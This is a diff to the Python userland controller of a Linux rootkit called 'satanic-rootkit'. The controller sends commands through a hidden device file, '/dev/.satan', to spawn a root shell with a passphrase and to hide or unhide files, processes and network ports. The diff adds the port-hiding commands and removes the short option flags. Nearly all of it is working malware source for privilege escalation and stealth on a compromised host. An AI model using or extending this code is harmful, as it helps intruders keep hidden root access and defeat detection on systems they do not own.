@@ -8,14 +8,16 @@ cdev = '/dev/.satan'
 
 def usage():
     return "usage: " + sys.argv[0] + " <command> [argument]\n\n" \
-        "-su --privesc <passphrase>       -- Acquire root shell.\n" \
-        "-fh --file-hide <path>           -- Hide a file/directory by absolute path.\n" \
-        "-fu --file-unhide <path>         -- Unhide a file/directory by absolute path.\n" \
-        "-ph --proc-hide <pid>            -- Hide a process by PID.\n" \
-        "-pu --proc-unhide <pid>          -- Unhide a process by PID.\n" \
+        "--privesc <passphrase>     -- Spawn a root shell (bash).\n" \
+        "--file-hide <path>         -- File/directory hiding by absolute path.\n" \
+        "--file-unhide <path>       -- File/directory unhiding by absolute path.\n" \
+        "--proc-hide <pid>          -- Process hiding by PID.\n" \
+        "--proc-unhide <pid>        -- Process unhiding by PID.\n" \
+        "--port-hide <pid>          -- Port hiding by port number.\n" \
+        "--port-unhide <pid>        -- Port unhiding by port number.\n" \
         "\n" \
-        "-h --help                        -- Help message.\n" \
-        "-v --version                     -- Version info." \
+        "-h --help                  -- Help message.\n" \
+        "-v --version               -- Version info." \
 
 def version():
     return "satanic-rootkit 0.1\n" \
@@ -34,7 +36,7 @@ if __name__ == '__main__':
         print(usage())
 
 
-    elif sys.argv[1] in ['-su', '--privesc']:
+    elif sys.argv[1] in ['--privesc']:
         has_n_args_or_die(3)
         command = 'privesc ' + sys.argv[2]
         payload = 'echo \'{}\' > {}'.format(command, cdev)
@@ -43,29 +45,40 @@ if __name__ == '__main__':
         os.system('/usr/bin/env bash --init-file .payload')
 
 
-    elif sys.argv[1] in ['-fh', '--file-hide']:
+    elif sys.argv[1] in ['--file-hide']:
         has_n_args_or_die(3)
         with open(cdev, 'w') as f:
             f.write('file_hide {}'.format(sys.argv[2]))
 
 
-    elif sys.argv[1] in ['-fu', '--file-unhide']:
+    elif sys.argv[1] in ['--file-unhide']:
         has_n_args_or_die(3)
         with open(cdev, 'w') as f:
             f.write('file_unhide {}'.format(sys.argv[2]))
 
 
-    elif sys.argv[1] in ['-ph', '--proc-hide']:
+    elif sys.argv[1] in ['--proc-hide']:
         has_n_args_or_die(3)
         with open(cdev, 'w') as f:
             f.write('proc_hide {}'.format(sys.argv[2]))
 
 
-    elif sys.argv[1] in ['-pu', '--proc-unhide']:
+    elif sys.argv[1] in ['--proc-unhide']:
         has_n_args_or_die(3)
         with open(cdev, 'w') as f:
             f.write('proc_unhide {}'.format(sys.argv[2]))
 
+
+    elif sys.argv[1] in ['--port-hide']:
+        has_n_args_or_die(3)
+        with open(cdev, 'w') as f:
+            f.write('port_hide {}'.format(sys.argv[2]))
+
+
+    elif sys.argv[1] in ['--port-unhide']:
+        has_n_args_or_die(3)
+        with open(cdev, 'w') as f:
+            f.write('port_unhide {}'.format(sys.argv[2]))
 
     elif sys.argv[1] in ['-h', '--help']:
         print(usage())
